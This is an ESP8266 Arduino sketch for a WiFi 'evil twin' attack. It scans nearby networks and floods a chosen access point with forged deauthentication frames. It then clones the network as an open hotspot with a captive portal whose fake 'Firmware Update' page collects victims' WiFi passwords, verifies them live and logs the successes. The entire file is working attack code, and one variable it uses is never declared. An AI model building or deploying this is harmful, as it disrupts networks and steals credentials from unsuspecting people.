#include <Arduino.h>
#include <DNSServer.h>
#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <LittleFS.h>

extern "C" {
  #include "user_interface.h"
}

// --- VARIABEL & CONFIG ---
DNSServer dnsServer;
ESP8266WebServer webServer(80);
IPAddress apIP(192, 168, 4, 1);
IPAddress subNetMask(255, 255, 255, 0);

const char *admin_ssid = "GMpro87";
const char *admin_pass = "Sangkur87";

struct networkDetails {
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
  int32_t rssi;
};

networkDetails networks[16];
networkDetails selectedNetwork;
String log_captured = "";
bool hotspot_active = false;
bool deauthing_active = false;
unsigned long last_deauth = 0;
unsigned long last_scan = 0;
String tryPass = "";

uint8_t deauthPacket[26] = { 0xC0, 0x00, 0x3A, 0x01, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00 };

// --- HELPER ---
String bytesToStr(const uint8_t* bytes, uint32_t size) {
  String result;
  for (uint32_t i = 0; i < size; ++i) {
    if (i > 0) result += ':';
    if (bytes[i] < 0x10) result += '0';
    result += String(bytes[i], HEX);
  }
  return result;
}

// --- UI ADMIN (GMpro87 STYLE) ---
String getAdminUI() {
  String html = R"rawliteral(<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'><title>GMpro87</title><style>body{background:#000;color:#fff;font-family:sans-serif;margin:0;padding:10px;}.header{text-align:center;border-bottom:2px solid #FFC72C;padding:10px;}.logo{color:#FFC72C;font-size:24px;font-weight:bold;}.table-box{border:1px solid #146dcc;margin-top:10px;}table{width:100%;border-collapse:collapse;}th,td{padding:8px;border:1px solid #146dcc;font-size:12px;text-align:center;}.btn{display:inline-block;padding:10px;margin:5px;border-radius:5px;text-decoration:none;font-weight:bold;color:#fff;font-size:11px;}.btn-pink{background:#eb3489;}.btn-red{background:#FF033E;}.btn-green{background:#0C873F;}.log-box{background:#111;border:1px dashed #FFC72C;height:120px;overflow-y:auto;padding:5px;font-family:monospace;color:#0f0;margin-top:10px;}</style></head><body><div class='header'><div class='logo'>GMpro87</div></div>)rawliteral";
  
  html += "<table><tr><th>SSID</th><th>RSSI</th><th>ACT</th></tr>";
  for (int i = 0; i < 16 && networks[i].ssid != ""; i++) {
    html += "<tr><td>" + networks[i].ssid + "</td><td>" + String(networks[i].rssi) + "</td>";
    html += "<td><a href='/?ap=" + bytesToStr(networks[i].bssid, 6) + "' class='btn btn-pink'>SEL</a></td></tr>";
  }
  html += "</table>";

  html += "<div style='text-align:center;margin-top:10px;'>";
  html += "<a href='/deauth' class='btn btn-red'>" + String(deauthing_active ? "STOP DEAUTH" : "START DEAUTH") + "</a>";
  html += "<a href='/hotspot' class='btn btn-green'>" + String(hotspot_active ? "STOP EVIL" : "START EVIL") + "</a>";
  html += "</div>";

  html += "<div class='log-box'><b>LOGS:</b><br>" + log_captured + "</div>";
  
  // Fitur Upload di Admin
  html += "<div style='margin-top:20px;background:#222;padding:10px;'><b>Upload index.html:</b><form method='POST' action='/upload' enctype='multipart/form-data'><input type='file' name='f'><button type='submit'>UPLOAD</button></form></div>";
  
  html += "</body></html>";
  return html;
}

// --- PHISHING PAGE ---
String getPhishingPage() {
  if (LittleFS.exists("/index.html")) {
    File f = LittleFS.open("/index.html", "r");
    String s = f.readString();
    f.close();
    return s;
  }
  return "<html><head><meta name='viewport' content='width=device-width,initial-scale=1'></head><body><h2>Firmware Update</h2><p>Verify password for " + selectedNetwork.ssid + "</p><form method='POST' action='/validate'><input type='password' name='pass' required><input type='submit' value='Update'></form></body></html>";
}

// --- ROUTES ---
void handleRoot() {
  if (hotspot_active && WiFi.softAPSSID() != admin_ssid) {
    webServer.send(200, "text/html", getPhishingPage());
  } else {
    if (webServer.hasArg("ap")) {
      String bssid = webServer.arg("ap");
      for (int i = 0; i < 16; i++) {
        if (bytesToStr(networks[i].bssid, 6) == bssid) selectedNetwork = networks[i];
      }
    }
    webServer.send(200, "text/html", getAdminUI());
  }
}

void handleValidate() {
  tryPass = webServer.arg("pass");
  log_captured += "[TRY] " + tryPass + "<br>";
  
  // FIX: Kasih respon dulu ke HP korban biar gak error
  webServer.send(200, "text/html", "<html><body><h2>Checking...</h2><script>setTimeout(function(){window.location.href='/';}, 5000);</script></body></html>");
  
  // Setelah respon terkirim, baru cek password (ini bikin ESP sibuk sebentar)
  delay(500); 
  WiFi.begin(selectedNetwork.ssid.c_str(), tryPass.c_str());
  
  unsigned long start = millis();
  while (millis() - start < 5000) { // Tunggu 5 detik buat verifikasi
    if (WiFi.status() == WL_CONNECTED) {
      log_captured += "<b>[SUCCESS] " + selectedNetwork.ssid + " : " + tryPass + "</b><br>";
      WiFi.disconnect();
      break;
    }
    yield();
  }
}

// --- CORE ---
void setup() {
  LittleFS.begin();
  WiFi.mode(WIFI_AP_STA);
  wifi_promiscuous_enable(1);
  WiFi.softAPConfig(apIP, apIP, subNetMask);
  WiFi.softAP(admin_ssid, admin_pass);
  dnsServer.start(53, "*", apIP);

  webServer.on("/", handleRoot);
  webServer.on("/validate", HTTP_POST, handleValidate);
  webServer.on("/deauth", [](){ deauthing_active = !deauthing_active; webServer.sendHeader("Location", "/"); webServer.send(302); });
  webServer.on("/hotspot", [](){
    hotspot_active = !hotspot_active;
    WiFi.softAPdisconnect(true);
    if(hotspot_active) WiFi.softAP(selectedNetwork.ssid.c_str(), NULL, selectedNetwork.ch);
    else WiFi.softAP(admin_ssid, admin_pass);
    webServer.sendHeader("Location", "/"); webServer.send(302);
  });
  webServer.on("/upload", HTTP_POST, [](){ webServer.send(200); }, [](){
    HTTPUpload& upload = webServer.upload();
    if (upload.status == UPLOAD_FILE_START) {
      fsUploadFile = LittleFS.open("/index.html", "w");
    } else if (upload.status == UPLOAD_FILE_WRITE) {
      if (fsUploadFile) fsUploadFile.write(upload.buf, upload.currentSize);
    } else if (upload.status == UPLOAD_FILE_END) {
      if (fsUploadFile) fsUploadFile.close();
    }
  });

  webServer.onNotFound([](){
    if(hotspot_active) { webServer.sendHeader("Location", "/", true); webServer.send(302); }
    else webServer.send(404, "text/plain", "Not Found");
  });

  webServer.begin();
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();

  // Logic Deauth
  if (deauthing_active && millis() - last_deauth > 200) {
    wifi_set_channel(selectedNetwork.ch);
    memcpy(&deauthPacket[10], selectedNetwork.bssid, 6);
    memcpy(&deauthPacket[16], selectedNetwork.bssid, 6);
    deauthPacket[0] = 0xC0; wifi_send_pkt_freedom(deauthPacket, 26, 0);
    deauthPacket[0] = 0xA0; wifi_send_pkt_freedom(deauthPacket, 26, 0);
    last_deauth = millis();
  }

  // Auto Scan
  if (millis() - last_scan > 15000 && !hotspot_active) {
    int n = WiFi.scanNetworks();
    if (n > 0) {
      for (int i = 0; i < min(n, 16); i++) {
        networks[i].ssid = WiFi.SSID(i);
        networks[i].ch = WiFi.channel(i);
        networks[i].rssi = WiFi.RSSI(i);
        memcpy(networks[i].bssid, WiFi.BSSID(i), 6);
      }
    }
    last_scan = millis();
  }
}
